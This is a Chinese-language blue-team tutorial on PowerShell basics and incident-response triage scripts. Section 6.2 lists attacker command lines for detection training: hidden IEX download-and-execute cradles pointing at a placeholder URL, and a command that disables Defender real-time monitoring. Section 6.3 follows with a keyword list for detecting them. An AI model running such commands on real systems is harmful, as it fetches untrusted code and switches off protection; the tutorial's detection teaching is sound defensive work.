---
title: "PowerShell 脚本基础"
date: 2026-11-10
draft: false
categories: ["蓝队"]
weight: 2
showTableOfContents: true
---

> 难度：★★★☆☆ ｜ 重要度：必学 ｜ 建议学时：15 小时 ｜ 前置：[Windows 基础](../02-计算机与网络基础/03-Windows基础.md)

## 1. 为什么蓝队要学 PowerShell

- Windows 原生自动化工具，无需安装额外环境。
- 可查询进程、服务、注册表、事件日志、网络连接、WMI/CIM。
- 攻击者大量使用 PowerShell（无文件、下载执行、横向移动），蓝队必须能看懂。
- 应急响应中可快速编写排查脚本。

> PowerShell 不是「命令行版 CMD」，它的核心是**对象与管道**。

---

## 2. 版本与执行策略

### 2.1 版本

| 版本 | 说明 |
|---|---|
| Windows PowerShell 5.1 | Windows 自带，基于 .NET Framework |
| PowerShell 7.x | 跨平台，基于 .NET，命令为 `pwsh` |

### 2.2 执行策略

```powershell
Get-ExecutionPolicy -List
Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
```

> 执行策略是**防止误运行**的机制，不是安全边界。攻击者可用 `-ExecutionPolicy Bypass` 绕过。

### 2.3 帮助系统

```powershell
Get-Help Get-Process
Get-Help Get-Process -Examples
Get-Command *event*
Get-Member
```

---

## 3. 基础语法

### 3.1 命令与参数

```powershell
Get-Process
Get-Service -Name ssh*
Get-ChildItem -Path C:\Windows -Filter *.log
Get-WinEvent -LogName System -MaxEvents 10
```

参数名可缩写，但脚本中建议写全，便于阅读。`Get-EventLog` 仅 Windows PowerShell 5.1 可用；PowerShell 7 请用 `Get-WinEvent`。

### 3.2 管道与对象

```powershell
Get-Process | Where-Object { $_.CPU -gt 100 } |
  Sort-Object CPU -Descending |
  Select-Object -First 10 Name, Id, CPU
```

- `$_` 表示管道当前对象
- `Where-Object` 过滤
- `Select-Object` 选属性
- `Sort-Object` 排序
- `ForEach-Object` 遍历

### 3.3 变量与类型

```powershell
$name = "blue"
$count = 10
$ratio = 0.5
$enabled = $true
$nothing = $null

[datetime]$time = "2026-11-09"
[int]$port = "443"
```

### 3.4 数组与哈希表

```powershell
$ips = @("10.0.0.1", "10.0.0.2")
$ips += "10.0.0.3"
$ips.Count

$log = @{
    IP = "10.0.0.1"
    Status = 200
    URI = "/login"
}
$log["IP"]
$log.Status
```

### 3.5 条件与循环

```powershell
if ($count -gt 5) {
    "big"
} elseif ($count -eq 5) {
    "equal"
} else {
    "small"
}

foreach ($ip in $ips) {
    Write-Output $ip
}

for ($i = 0; $i -lt 3; $i++) {
    Write-Output $i
}
```

### 3.6 函数

```powershell
function Test-PrivateIP {
    param([string]$IP)
    $parts = $IP.Split(".")
    if ($parts.Count -ne 4) { return $false }
    $first = [int]$parts[0]
    $second = [int]$parts[1]
    return ($first -eq 10) -or
           ($first -eq 172 -and $second -ge 16 -and $second -le 31) -or
           ($first -eq 192 -and $second -eq 168)
}

Test-PrivateIP "192.168.1.10"
```

---

## 4. 文件与数据处理

### 4.1 文件

```powershell
Get-Content .\access.log -Tail 100
Get-Content .\access.log | Select-String "Failed"
Set-Content .\result.txt "hello"
Add-Content .\result.txt "world"
Test-Path .\result.txt
Get-Item .\result.txt | Format-List *
```

### 4.2 CSV

```powershell
$rows = Import-Csv .\alerts.csv
$rows | Group-Object rule | Sort-Object Count -Descending |
  Select-Object Count, Name

$rows | Export-Csv .\result.csv -NoTypeInformation -Encoding UTF8
```

### 4.3 JSON

```powershell
$data = Get-Content .\data.json -Raw | ConvertFrom-Json
$data.ip
$data | ConvertTo-Json -Depth 5
```

### 4.4 正则

```powershell
"src=10.0.0.1 dst=8.8.8.8" -match "\b(?:\d{1,3}\.){3}\d{1,3}\b"
$Matches[0]

[regex]::Matches($text, $pattern)
```

---

## 5. 系统排查命令

### 5.1 进程

```powershell
Get-Process | Sort-Object CPU -Descending | Select -First 20
Get-CimInstance Win32_Process |
  Select ProcessId, ParentProcessId, Name, CommandLine, ExecutablePath

# 找异常路径
Get-CimInstance Win32_Process |
  Where-Object { $_.ExecutablePath -match "Temp|Public|ProgramData" } |
  Select ProcessId, Name, ExecutablePath, CommandLine
```

### 5.2 服务

```powershell
Get-Service | Where-Object Status -eq "Running"
Get-CimInstance Win32_Service |
  Select Name, State, StartName, PathName, StartMode

Get-CimInstance Win32_Service |
  Where-Object { $_.PathName -match "Temp|Public|ProgramData" } |
  Select Name, PathName
```

### 5.3 网络

```powershell
Get-NetTCPConnection -State Listen |
  Select LocalAddress, LocalPort, OwningProcess
Get-NetTCPConnection -State Established |
  Select LocalAddress, LocalPort, RemoteAddress, RemotePort, OwningProcess
Get-NetUDPEndpoint
Get-DnsClientCache
```

### 5.4 注册表

```powershell
Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
Get-ChildItem "HKLM:\System\CurrentControlSet\Services" |
  Where-Object { $_.GetValue("ImagePath") -match "Temp|Users|ProgramData" }
```

### 5.5 计划任务

```powershell
Get-ScheduledTask
Get-ScheduledTask | Where-Object State -eq "Ready" |
  Select TaskName, TaskPath
Get-ScheduledTaskInfo -TaskName "\Microsoft\Windows\UpdateOrchestrator\Schedule Scan"
```

### 5.6 事件日志

```powershell
Get-WinEvent -LogName Security -MaxEvents 20
Get-WinEvent -FilterHashtable @{LogName="Security"; Id=4625} -MaxEvents 20

# 最近 24 小时登录失败
$start = (Get-Date).AddHours(-24)
Get-WinEvent -FilterHashtable @{
  LogName="Security"; Id=4625; StartTime=$start
} | Select TimeCreated, Message
```

### 5.7 用户与组

```powershell
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember -Group "Administrators"
Get-CimInstance Win32_UserAccount
```

---

## 6. PowerShell 日志与攻击检测

### 6.1 日志类型

| 日志 | 事件 ID | 作用 |
|---|---|---|
| 脚本块日志 | 4104 | 记录执行的脚本内容 |
| 模块日志 | 4103 | 记录模块/命令 |
| 引擎启动 | 400/403 | 引擎启停 |
| 转录 | 文件 | 会话记录 |
| AMSI | — | 恶意脚本检测 |

启用脚本块日志（组策略或注册表）：

```powershell
# 实验环境
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name EnableScriptBlockLogging -Value 1
```

### 6.2 攻击者常见命令

```powershell
powershell -enc <Base64>
powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://...')"
powershell -c "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://...')"
powershell -c "[Convert]::FromBase64String('...')"
powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true"
```

### 6.3 检测特征

- `-EncodedCommand` / `-enc` / `-e`
- `-NoProfile` / `-nop`
- `-WindowStyle Hidden` / `-w hidden`
- `-ExecutionPolicy Bypass` / `-ep bypass`
- `IEX` / `Invoke-Expression`
- `DownloadString` / `DownloadFile` / `WebClient`
- `FromBase64String`
- `Add-MpPreference` / `Set-MpPreference`
- `Net.WebClient` / `Start-BitsTransfer`
- 长 Base64 字符串

> 这些特征不是绝对恶意，需结合父进程、用户、时间、网络行为判断。

---

## 7. 远程管理与 CIM

```powershell
Enter-PSSession -ComputerName server01
Invoke-Command -ComputerName server01 -ScriptBlock { Get-Process }
New-PSSession -ComputerName server01
```

CIM/WMI：

```powershell
Get-CimInstance -ClassName Win32_OperatingSystem
Get-CimInstance -ClassName Win32_LogicalDisk
Get-CimInstance -ClassName Win32_NetworkAdapterConfiguration
```

**攻击滥用**：

- `Invoke-Command` 横向
- WMI 远程执行
- WinRM 端口 5985/5986
- 远程服务创建（PsExec）

**检测**：WinRM 日志、PowerShell 操作日志、4688、网络连接 5985/5986。

---

## 8. 错误处理

```powershell
$ErrorActionPreference = "Stop"

try {
    Get-Content .\missing.log -ErrorAction Stop
}
catch {
    Write-Error "读取失败: $($_.Exception.Message)"
}
finally {
    Write-Output "done"
}
```

- `-ErrorAction SilentlyContinue` 忽略错误（慎用）
- `-ErrorVariable` 收集错误
- `$?` 上一条命令是否成功
- `$LASTEXITCODE` 外部程序退出码

---

## 9. 蓝队脚本示例

### 9.1 主机快速排查

```powershell
$out = "C:\Temp\ir"
New-Item -ItemType Directory -Path $out -Force | Out-Null
$time = Get-Date -Format "yyyyMMdd_HHmmss"

Get-Process | Export-Csv "$out\process_$time.csv" -NoTypeInformation -Encoding UTF8
Get-CimInstance Win32_Process | Select ProcessId,ParentProcessId,Name,CommandLine,ExecutablePath |
  Export-Csv "$out\process_detail_$time.csv" -NoTypeInformation -Encoding UTF8
Get-NetTCPConnection | Export-Csv "$out\net_$time.csv" -NoTypeInformation -Encoding UTF8
Get-Service | Export-Csv "$out\service_$time.csv" -NoTypeInformation -Encoding UTF8
Get-ScheduledTask | Export-Csv "$out\task_$time.csv" -NoTypeInformation -Encoding UTF8
Get-LocalUser | Export-Csv "$out\user_$time.csv" -NoTypeInformation -Encoding UTF8
Get-LocalGroupMember -Group "Administrators" |
  Export-Csv "$out\admins_$time.csv" -NoTypeInformation -Encoding UTF8
```

### 9.2 统计登录失败

```powershell
$start = (Get-Date).AddDays(-7)
$events = Get-WinEvent -FilterHashtable @{
    LogName = "Security"; Id = 4625; StartTime = $start
}

$events | ForEach-Object {
    $xml = [xml]$_.ToXml()
    [pscustomobject]@{
        Time = $_.TimeCreated
        User = $xml.Event.EventData.Data | Where-Object Name -eq "TargetUserName" | Select -Expand "#text"
        IP   = $xml.Event.EventData.Data | Where-Object Name -eq "IpAddress" | Select -Expand "#text"
    }
} | Group-Object IP | Sort-Object Count -Descending |
  Select Count, Name -First 20
```

### 9.3 查找可疑启动项

```powershell
$paths = @(
  "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run",
  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
  "HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"
)

foreach ($p in $paths) {
    if (Test-Path $p) {
        Write-Output "== $p =="
        Get-ItemProperty $p | Format-List
    }
}
```

---

## 10. 动手练习

1. 用 PowerShell 列出所有监听端口及对应进程。
2. 统计最近 7 天 4625 登录失败的源 IP Top10。
3. 导出所有计划任务并筛选非 Microsoft 路径。
4. 查询管理员组成员。
5. 写一个函数判断 IP 是否内网。
6. 解析一个 JSON 告警文件并统计规则数量。
7. 开启脚本块日志，运行一段脚本，在事件查看器中找到 4104。

---

## 11. 常见误区

- 把 PowerShell 当成 CMD 的替代品，只会单条命令。
- 不会用对象与管道，靠字符串截取。
- 认为执行策略能防恶意脚本。
- 不使用 `-ErrorAction`，错误被吞。
- 在生产环境直接运行未测试脚本。
- 不记录脚本操作，破坏证据。

---

## 12. 自测

1. PowerShell 管道传递的是什么？
2. `$_` 与 `$PSItem` 是什么？
3. 如何查看一个进程的父进程与命令行？
4. 如何查询事件 ID 4625？
5. PowerShell 攻击常见命令行特征有哪些？
6. 如何开启脚本块日志？
7. `-ErrorAction Stop` 的作用是什么？

---

## 13. 延伸阅读

- [PowerShell 官方文档](https://learn.microsoft.com/en-us/powershell/)
- [PowerShell 101](https://learn.microsoft.com/en-us/powershell/scripting/learn/ps101/00-introduction)
- [About PowerShell Events](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_eventlogs)
- [Microsoft：PowerShell 日志](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows)
- [LOLBAS：PowerShell](https://lolbas-project.github.io/lolbas/Binaries/Powershell/)
- [MITRE ATT&CK：PowerShell](https://attack.mitre.org/techniques/T1059/001/)

---

## 14. 下一步

- [Bash 脚本基础](03-Bash脚本基础.md)
- [Windows 日志分析](../06-主机与终端安全/02-Windows日志分析.md)
- [Sysmon 详解](../06-主机与终端安全/03-Sysmon详解.md)
